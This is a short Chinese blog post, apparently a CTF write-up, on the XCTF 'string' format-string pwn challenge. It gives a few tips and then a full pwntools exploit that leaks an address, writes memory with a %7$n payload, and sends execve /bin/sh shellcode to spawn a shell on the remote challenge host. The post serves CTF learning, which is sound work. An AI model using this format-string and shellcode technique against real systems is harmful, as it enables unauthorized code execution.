---
title: FormatString 
tags: [ctf-pwn]
date: 2023-10-23 13:48:00
categories: [ctf-pwn]
excerpt: xctf-pwn string
---

![](/img/FormatString/1.png)

#### xctf string

简单的格式化字符串

这道题目需要注意的点包括

1. 题目中用%x打印出来的地址，可以直接用`int(...,16)`来接收，不要用ljust那一套。。。（-_-||

2. 在利用格式化字符串漏洞的时候，如果用`p64(addr)  + %n(或者%p)...`时，要先保证addr没有`\0`

   就像这道题，我一开始就非得不用它那个%ld输入要写入的地址，就非要把x[0]的地址和后面那一串一起写进去，后果就是print(format)时候根本不会打印aaaa.....和%n，因为地址里有\0，直接停止了😭还在那看了好半天是不是地址的格式问题

3. `shellcraft.sh`用之前**一定要先指定平台 **` context(arch='amd64', os='linux')`

   

exp:

```python
from pwn import *

#p = process("./1d3c852354df4609bf8e56fe8e9df316")
p = remote("61.147.171.105", 58702)

context(arch='amd64', os='linux')

e = ELF("./1d3c852354df4609bf8e56fe8e9df316")

#gdb.attach(p, "b *0x400d36")

p.recvuntil(b"secret[0] is ")
x0 = int(p.recvuntil(b"\n")[:-1], 16)
print(hex(x0))

p.recvuntil(b"What should your character's name be:\n")
p.sendline(b"123")

p.recvuntil(b"So, where you will go?east or up?:")
p.sendline(b"east")
p.recvuntil(b"go into there(1), or leave(0)?:\n")
p.sendline(b"1")

p.recvuntil(b"\'Give me an address\'\n")
p.sendline(str(x0))

p.recvuntil(b"And, you wish is:\n")

payload = b'a' * 85 + b"%7$n"
#payload = b'aaaaaaaa' + b"%p%p%p%p-%p%p%p%p-%p%p%p%p-%p%p%p%p"
p.sendline(payload)

p.recvuntil(b"That's sound terrible! you meet final boss!but you level is ONE!\n")
p.recvuntil(b"Wizard: I will help you! USE YOU SPELL\n")

#shellcode = '\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'

shellcode = asm(shellcraft.sh())


p.sendline(shellcode)

p.interactive()
```

